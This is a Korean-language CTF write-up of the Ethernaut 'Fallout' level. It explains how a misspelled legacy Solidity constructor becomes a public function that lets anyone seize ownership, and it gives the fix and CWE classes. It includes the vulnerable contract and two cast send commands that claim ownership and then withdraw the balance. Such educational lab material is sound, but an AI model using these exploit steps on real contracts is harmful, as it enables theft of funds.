# [Ethernaut] 02-fallout

## 취약점 요약
사실 이번 문제를 풀면서 의아한 부분이 좀 있었습니다. 먼저 클리어 조건 중에 **해당 컨트랙트의 소유권 획득하기**가 있습니다. 이어서 코드를 보면 Fal1out() 함수가 constructor가 아닌 일반 함수로 선언되어 있기에 호출만 하면 바로 owner 권한을 얻을 수 있습니다. 문제가 너무 쉬워서 뭔가 싶었는데
0.4.x 이하 버전에서는 컨트랙트 이름과 똑같게 함수를 선언하면 생성자로 인식 됐었다는 걸 알았고 해당 문제는 constructor로 생성자 선언이 아닌 위와 같은 방법으로 생성자 선언하는게 왜 위험한지! 알려주는 문제라는걸 알았습니다.

이번 문제의 취약점은 0.4.x 이하의 버전에서 생성자를 선언 할 때 오타가 나버려서 컴파일러가 생성자가 아닌 일반 함수로 인식해버려서 누구든 owner 권한을 얻을 수 있다는 것입니다.

(근데 해당 컨트랙트 버전을 보면 0.6.0이라서 원래라면 배포는 물론 컴파일 자체가 안됐어야 하지만...)

## 사전 지식
1. **Solidity 0.4.x 이하 버전에서의 이름 기반 생성자 규칙**: 버전안에서 또 나뉘지만 생성자 선언을 할 떄 constructor를 사용하거나 컨트랙트와 함수의 이름을 같게하여 생성자를 선언 할 수 있었습니다.

ps, 0.4.22 미만 버전에서는 constructor 키워드 자체가 없었습니다.

## 취약 코드

```solidity
contract Fallout {
    using SafeMath for uint256;

    mapping(address => uint256) allocations;
    address payable public owner;

    /* constructor */
    function Fal1out() public payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
    }
}
```

## 원인 분석
1. 생성자 선언의 실패
의도대로라면 컨트랙트와 함수의 이름을 같게 해서 Fal1out()을 생성자로 선언하려고 했지만 보시는거와 같이 오타가 나서 컴파일러가 일반 함수로 인식하고 있습니다.

따라서 Fal1out() 함수를 호출하기만 하면 owner 권한을 얻을 수 있고
이어서 owner만 접근 가능한 collectAllocations() 함수까지 호출한다면 컨트랙트의 잔고를 가져올 수 있습니다.

## 익스플로잇 로직
```bash
cast send <인스턴스 주소> "Fal1out()" \ --value 0ether \ --rpc-url <RPC_URL> \--account <지갑 계정>
```

```bash
cast send <인스턴스 주소> "collectAllocations()" --rpc-url <RPC_URL> --account <지갑 계정>
```

## 수정 방안
```solidity
contract Fallout {
    using SafeMath for uint256;

    mapping(address => uint256) allocations;
    address payable public owner;
        // 0.6.0 버전을 사용하고 있으니 constructor로 생성자 선언.
    constructor() public payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
    }
}
```

## CWE 분류
- **CWE-665 (Improper Initialization)**
- **CWE-284 (Improper Access Control)**